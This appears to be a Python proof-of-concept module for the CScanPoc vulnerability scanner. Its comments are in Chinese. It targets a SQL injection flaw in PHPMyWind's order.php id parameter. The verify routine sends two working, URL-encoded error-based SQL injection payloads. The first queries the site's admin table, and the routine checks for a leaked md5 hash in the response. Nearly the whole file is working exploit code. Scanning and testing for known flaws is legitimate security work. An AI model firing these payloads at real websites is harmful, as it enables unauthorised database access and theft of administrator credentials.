# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PHPMyWind_0000'  # 平台漏洞编号，留空
    name = 'PHPMyWind 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-28'  # 漏洞公布时间
    desc = '''
        PHPMyWind 是一款基于PHP+MySQL开发，符合W3C标准的建站引擎。
        PHPMyWind /order.php?id= 注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=051256'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b01fabeb-7def-453f-af64-356aa3c8461d'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))

        def getString(res):
            import re
            Regular = "Duplicate entry \'qgveq\|(.+):split:([a-fA-F0-9]{32})\|qkagq"
            Temp = re.search(Regular, res)
            if Temp != None:
                Temp = Temp.group(0)
                return Temp
            else:
                return ""
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = (
                '/order.php?id=-@`%27`%20UnIon%20select%20username%20from%20`%23@__admin`%20where%20(select%201%20from%20(select%20count(*)%20,concat((select%20concat(0x7167766571,0x7c,md5(123),0x3a73706c69743a,md5(123),0x7c,0x716b616771)),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20id=@`%27`',
                '/order.php?id=-%40%60%27%60%20AND%20%28SELECT%202598%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7167766571%2C%28SELECT%20MID%28%28IFNULL%28CAST%28concat(0x7c,md5(123)%2C0x3a73706c69743a%2Cmd5(123),0x7c)%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x716b616771%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29and%20id%3D%40%60%27%60'
            )
            for payload in payloads:
                target = arg + payload
                headers = {
                    "Cookie": "shoppingcart=a,username=a"
                }
                req = requests.get(target, headers=headers)
                if req.status_code == 200 and "202cb962ac59075b964b07152d234b70"in req.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(
                        target=self.target, name=self.vuln.name, url=target))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
